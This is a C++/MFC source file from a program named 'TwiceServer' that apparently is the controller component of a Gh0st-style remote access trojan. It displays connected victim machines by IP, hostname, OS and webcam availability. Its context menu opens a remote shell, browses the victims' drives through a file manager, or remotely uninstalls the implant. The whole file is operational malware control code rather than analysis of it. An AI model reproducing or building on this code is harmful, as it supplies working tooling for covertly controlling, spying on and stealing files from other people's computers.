
// ChildView.cpp : CChildView 类的实现
//

#include "stdafx.h"
#include "TwiceServer.h"
#include "ChildView.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
extern CChildView* g_pConnectView;
extern CMainFrame* g_pFrame;
#define WM_MYINITIALUPDATE (WM_USER + 101)
#define UM_CREAT_LISTCONTROL (WM_USER + 9527)
typedef struct
{
	char	*title;
	double		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] = 
{
	{"ID",				0.1	},
	{"WAN",				0.1},
	{"LAN",				0.1	},
	{"Hostname",		0.2	},
	{"OS",				0.2	},
	{"CPU",				0.1	},
	{"Ping",			0.1	},
	{"camera",			0.1	},
};

int g_Column_Width = 0;
int	g_Column_Count = sizeof(g_Column_Data) / 16;




// CChildView

CChildView::CChildView()
{
	m_nCount = 0;
	((CTwiceServerApp *)AfxGetApp())->m_pConnectView = this;
}

CChildView::~CChildView()
{
}


BEGIN_MESSAGE_MAP(CChildView, CWnd)
	ON_WM_PAINT()
	ON_MESSAGE(UM_CREAT_LISTCONTROL, OnCreateListCtrl)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	//ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_WM_CREATE()
	ON_WM_SIZE()
	ON_WM_CONTEXTMENU()
	

	
	ON_COMMAND(ID_LISTCTRLMENU_SHELL, &CChildView::OnListctrlmenuShell)
	ON_COMMAND(ID_LISTCTRLMENU_FILEMANAGER, &CChildView::OnListctrlmenuFilemanager)
	ON_COMMAND(ID_LISTCTRLMENU_DISCONNECT, &CChildView::OnListctrlmenuDisconnect)
END_MESSAGE_MAP()



// CChildView 消息处理程序

BOOL CChildView::PreCreateWindow(CREATESTRUCT& cs) 
{
	if (!CWnd::PreCreateWindow(cs))
		return FALSE;

	cs.dwExStyle |= WS_EX_CLIENTEDGE;
	cs.style &= ~WS_BORDER;
	cs.lpszClass = AfxRegisterWndClass(CS_HREDRAW|CS_VREDRAW|CS_DBLCLKS, 
		::LoadCursor(NULL, IDC_ARROW), reinterpret_cast<HBRUSH>(COLOR_WINDOW+1), NULL);

	
	return TRUE;
}

void CChildView::OnPaint() 
{
	CPaintDC dc(this); // 用于绘制的设备上下文
	
	// TODO: 在此处添加消息处理程序代码
	
	// 不要为绘制消息而调用 CWnd::OnPaint()
}


LRESULT CChildView::OnCreateListCtrl(WPARAM wParam, LPARAM lParam)
{
	CRect rect;
	GetClientRect(rect);
	m_ListCtrl.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT, 
						rect/*CRect(rect.left + 10, rect.top + 10, rect.right - 10, rect.bottom - 10 - 60)*/, 
						this, NULL);

	ASSERT(m_ListCtrl.GetSafeHwnd());
	m_ListCtrl.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES );
	int width = rect.Width();
	for (int i=0;i<g_Column_Count;i++)
	{
		m_ListCtrl.InsertColumn(i,g_Column_Data[i].title,LVCFMT_LEFT,(int)width*g_Column_Data[i].nWidth);
	}
	return 0;
}

int CChildView::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	// TODO:  在此添加您专用的创建代码
	PostMessage(UM_CREAT_LISTCONTROL);

	return 0;
}


void CChildView::OnSize(UINT nType, int cx, int cy)
{
	CWnd::OnSize(nType, cx, cy);
	if (m_ListCtrl.m_hWnd == NULL)
		return;
	CRect rect;
	GetClientRect(&rect);
	m_ListCtrl.MoveWindow(rect);
	int width = rect.Width();
	for (int i=0;i<g_Column_Count;i++)
	{
		m_ListCtrl.SetColumnWidth(i,(int)width*g_Column_Data[i].nWidth);
	}
	// TODO: 在此处添加消息处理程序代码
}

LRESULT CChildView::OnAddToList(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText, strOS;
	try
	{
		int nCnt = m_ListCtrl.GetItemCount();

		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		// ID
		CString	str;
		str.Format("%d", m_nCount++);	

		// IP地址
		int i = m_ListCtrl.InsertItem(nCnt, str);

		// 外网IP

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		m_ListCtrl.SetItemText(i, 1, IPAddress);

		// 内网IP
		m_ListCtrl.SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));

		// 主机名
		m_ListCtrl.SetItemText(i, 3, LoginInfo->HostName);

		// 系统
		////////////////////////////////////////////////////////////////////////////////////////
		// 显示输出信息
		char *pszOS = NULL;
		if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			pszOS = "NT";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			pszOS = "Windows 2000";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			pszOS = "Windows XP";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wSuiteMask & VER_SUITE_WH_SERVER))
			pszOS = "Windows Home Server ";
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows Vista";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2008";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows 7";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2008 R2";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows 8";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2012";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
			pszOS = "Windows 8.1";  
		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
			pszOS = "Windows Server 2012 R2";
		else
		{pszOS = "unknown";}

		strOS.Format
			(
			"%s SP%d (Build %d)",
			//OsVerInfo.szCSDVersion,
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		m_ListCtrl.SetItemText(i, 4, strOS);
		// CPU
		str.Format("%dMHz", LoginInfo->CPUClockMhz);
		m_ListCtrl.SetItemText(i, 5, str);

		// Speed
		str.Format("%d", LoginInfo->dwSpeed);
		m_ListCtrl.SetItemText(i, 6, str);

		str = LoginInfo->bIsWebCam ? "Y" : "--";
		m_ListCtrl.SetItemText(i, 7, str);
		// 指定唯一标识
		m_ListCtrl.SetItemData(i, (DWORD) pContext);

	}catch(...){}

	return 0;
}

void CChildView::OnContextMenu(CWnd* pWnd, CPoint point)
{
	HWND hWnd = AfxGetMainWnd()->m_hWnd;
	CWnd* pCWnd = FromHandle(hWnd);

	CMenu menu;
	CMenu* pPopup;
	menu.LoadMenu (IDR_LIST);
	pPopup = menu.GetSubMenu(0);
	ASSERT(pPopup != NULL);	
	int listFlag;
	listFlag = m_ListCtrl.GetSelectedCount();
	if (listFlag <= 0)
	{
		pPopup->EnableMenuItem(ID_LISTCTRLMENU_SHELL,MF_GRAYED);
		pPopup->EnableMenuItem(ID_LISTCTRLMENU_FILEMANAGER,MF_GRAYED);
		pPopup->EnableMenuItem(ID_LISTCTRLMENU_DISCONNECT,MF_GRAYED);
	}
	else
	{
		pPopup->EnableMenuItem(ID_LISTCTRLMENU_SHELL,MF_ENABLED);
		pPopup->EnableMenuItem(ID_LISTCTRLMENU_FILEMANAGER,MF_ENABLED);
		pPopup->EnableMenuItem(ID_LISTCTRLMENU_DISCONNECT,MF_ENABLED);
	}
	pPopup->TrackPopupMenu(TPM_LEFTALIGN|TPM_LEFTBUTTON, 
		point.x, point.y, pCWnd);	
	// TODO: 在此处添加消息处理程序代码
}
LRESULT CChildView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg *dlg = new CShellDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}
LRESULT CChildView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	// 删除链表过程中可能会删除Context
	try
	{
		int nCnt = m_ListCtrl.GetItemCount();
		for (int i=0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)m_ListCtrl.GetItemData(i))
			{
				m_ListCtrl.DeleteItem(i);
				break;
			}		
		}
		// 关闭相关窗口
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
		case SYSTEM_DLG:
		case SHELL_DLG:
			//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
			break;
		default:
			break;
		}
	}catch(...){}

	return 0;
}
void CChildView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	// TODO: Add your command handler code here

	POSITION pos = m_ListCtrl.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_ListCtrl.GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_ListCtrl.GetItemData(nItem);
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, pData, nSize);

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}

void CChildView::OnListctrlmenuShell()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}


void CChildView::OnListctrlmenuFilemanager()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CChildView::OnListctrlmenuDisconnect()
{
	// TODO: 在此添加命令处理程序代码
	if (MessageBox("确认卸载服务端吗 -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}
LRESULT CChildView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}